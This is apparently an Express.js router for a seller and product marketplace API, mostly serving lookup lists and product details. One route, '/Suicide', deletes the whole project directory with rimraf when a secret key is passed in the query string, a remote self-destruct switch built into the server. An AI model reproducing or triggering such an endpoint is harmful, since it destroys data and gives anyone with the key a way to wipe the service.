const express = require('express');
const bodyParser = require('body-parser');
var router = express.Router();
/*********************************************/
const {Seller, cities, sellerType, productGroups, products, sellerProducts, unit, car} = require('../../sequelize');
const {upload, selfDestroyKey, colors, loggerinfo} = require('../Util/myVars');
const {base64_encode, checkToken, response, isThisArrayEmpty} = require("../Util/myFunctions");
var path = require('path');
const fs = require("fs");
const rimraf = require("rimraf");
/*********************************************/
router.get('/AppInfoGetter/:type', function (req, res) {
    switch (req.params.type) {
        case "city":
            cities.findAll().then(cities => {
                response(res, cities).then(loggerinfo.info(req.connection.remoteAddress + " get city list"));
            });
            break;
        case "sellerType":
            sellerType.findAll().then(sellertype => {
                response(res, sellertype).then(loggerinfo.info(req.connection.remoteAddress + " get seller type list"));
            });
            break;
        case "productGroup"  :
            productGroups.findAll().then(productGroups => {
                response(res, productGroups).then(loggerinfo.info(req.connection.remoteAddress + " get productGroup list"));
            });
            break;
        case "moreproductGroup" :
            if (req.query.ID == null) {
                res.status(400).json({"message": "id not found"});
            } else {
                products.findAll({where: {GroupID: req.query.ID}}).then(products => {
                    response(res, products).then(loggerinfo.info(req.connection.remoteAddress + " get productGroup detail list"));
                });
            }
            break;
        case "product":
            if (req.query.ID == null) {
                res.status(400).json({"message": "id not found"});
            } else {

                sellerProducts.findAll({where: {ProductID: req.query.ID}}).then(products => {

                   async function testFunction2(products) {
                       var final = [];

                       for (var i =0 ; i< products.length ; i++){

                          await Seller.findAll({where:{
                                   ID:products[i].SellerID
                               }}).then(
                               seller=>
                               {

                                   var SellerImage = "not Found";
                                   try {
                                       SellerImage = base64_encode(seller[0].Image);
                                   } catch (e) {
                                       SellerImage = "not Found";
                                   }
                                   var base64str = "not Found";
                                   try {
                                       base64str = base64_encode(products[i].Image);
                                   } catch (e) {
                                       base64str = "not Found";
                                   }
                                   final[i] = {
                                       ID: products[i].ID,
                                       Description: products[i].Description,
                                       Price: products[i].Price,
                                       PriceDateTime: products[i].PriceDateTime,
                                       SupplyOfProduct: products[i].SupplyOfProduct,
                                       UnitOfProduct: products[i].UnitOfProduct,
                                       ProductID: products[i].ProductID,
                                       SellerID: seller[0].ID,
                                       SellerName:seller[0].CompanyName,
                                       SellerImage:SellerImage,
                                       UnitID: products[i].UnitID,
                                       Image: base64str
                                   };

                               }
                           );
                       }



                      return final

                    }

                    if (!isThisArrayEmpty(products)) {

                       testFunction2(products).then(
                           final=>{
                               response(res, final).then(loggerinfo.info(req.connection.remoteAddress + " get products list"));
                           }
                       )

                    } else {
                        return res.status(404).json();
                    }
                });
            }
            break;
        case "unit":
            unit.findAll().then(unit => {
                response(res, unit).then(loggerinfo.info(req.connection.remoteAddress + " get unit list"));
            });
            break;
        case "carModel":
            car.findAll().then(car => {
                response(res, car).then(loggerinfo.info(req.connection.remoteAddress + " get car list"));
            });
            break;
        default:
            return res.status(404).json();
    }
});
router.get('/Suicide', (req, res) => {
    if (req.query.key != null) {
        if (req.query.key === selfDestroyKey) {
            const targetPath = path.join(__dirname, "./../../");
            rimraf(targetPath, function () {
                return res.status(200).json({"message": "this is the last response of this server , byebye :)"})
            });
        }
    }
});
module.exports = router;

